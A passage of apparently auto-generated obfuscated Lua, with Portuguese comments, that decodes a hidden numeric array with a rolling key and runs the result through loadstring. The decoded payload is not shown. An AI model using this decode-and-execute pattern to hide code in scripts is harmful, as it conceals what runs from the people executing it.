    local function VM_00Il0(d, k, m)
        local R_0OllI = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_0OllI, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_0OllI)
    end

    -- Execution Guard
    local F_0O1Ol = loadstring(VM_00Il0(B_lOlO0I, 27, 5))
    if F_0O1Ol then
        F_0O1Ol(...)
    end
end)(...)
